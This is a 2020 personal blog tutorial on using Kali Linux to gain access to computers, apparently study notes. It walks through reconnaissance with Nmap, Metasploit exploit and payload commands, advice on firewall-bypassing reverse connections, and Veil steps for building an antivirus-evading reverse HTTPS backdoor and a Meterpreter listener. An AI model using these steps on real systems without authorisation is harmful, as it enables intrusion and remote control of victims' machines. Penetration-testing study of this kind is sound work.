Title: Gaining Access with Kali Linux
Date: 2020-05-xx
Author: Jack McKew
Category: Software
Tags: software

This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <https://www.kali.org/downloads/>.

> Thank you to Chris B for helping me with the notes in this post below!

## Gaining Access

Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
Two types of attacks:

1. Server side - Doesn't require user interaction all we need is an IP
2. Client side - Requires user interaction such as opening a file or clicking a link

### Server Side Attacks

Make sure the machine is pingable (open terminal and run `ping [IP]`). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:

- Operating systems
- Installed programs
- Ports being used
- etc

We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:

- Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.
- Google the version of operating system / programs for potential exploits
- If you find an open FTP (file transfer protocol) port, try to connect through it
- Try default usernames and passwords to log in (sometimes they won't have a password)


#### Metasploit

Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: <https://information.rapid7.com/download-metasploitable-2017.html>.


#### Exploiting Backdoors

First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:

- `msfconsole` (runs the metasploit console)
- `help` (help on any command)
- `show [something]` (something can be exploits, payloads, auxilaries or options)
- `use [something]` (uses an exploit, payload, auxilarie)
- `set [option] [value]` (configure [option] to have [value] )
- `exploit` - runs the current task

##### An Example Backdoor Attack

Typically this will only work if the backdoor is already installed on the target computer.

1. find out the exploit to use via google
2. open `msfconsole`
3. type `use [exploit_name/path]`
4. `show options`
5. set the options (usually the RHOSTS) `set RHOSTS [ip]
6. run `exploit`

If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.

##### Payloads

A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:

- to open a port on the target and connect to it (aka `bind`)
- open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka `reverse`)

> On a `reverse`, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.

Setting a payload in metasploit can be done with the option `set payload [payload]`.

#### Nexpose

Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!

[![Nexpose]({static img/nexpose.jpg})](https://www.rapid7.com/products/nexpose/)

Nexpose can be downloaded from: <https://www.rapid7.com/products/nexpose/>.

> There is a free community edition!

### Client Side Attacks

Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.

#### Creating Backdoors

For creating backdoors we use a program called `veil`. Veil can installed via `apt-get`, and the source code is all open over at: <https://github.com/Veil-Framework/Veil>.

To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):

1. Run `veil`
2. `list` to list available tools
3. `use [toolname]` to use tools, evasion is a typical tool to use
4. `list` (under a tool) to see available payloads
5. `use [payload number]`
6. check the options to set
7. be sure to set the LHOST (the IP for the target to connect to)
8. `set LHOST [ip]`
9. if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)
10. `set LPORT 8080`
11. `options` to see options.
12. <set PROCESSERS [number(1)]> change processers.
13. <set SLEEP [number(6)]
13 <generate> to make backdoor.

- To check if it is detectable you can use the check vt command or better method:
- go to a website call no distrubute and scan there.

We need to listen for the connection.
Need the attack payload and the port (go/meterpeter/rev_https, 8080)

1. Open the metasploit framework. <msfconsole>
2. To listen use the handler moudule
3. <use exploit/multi/handler>
4. set the payload <set PAYLOAD windows/meterpeter/reverse_https>
5. set the correct settings (the LPORT and LHOST you used in the backdoor).
6. <exploit>
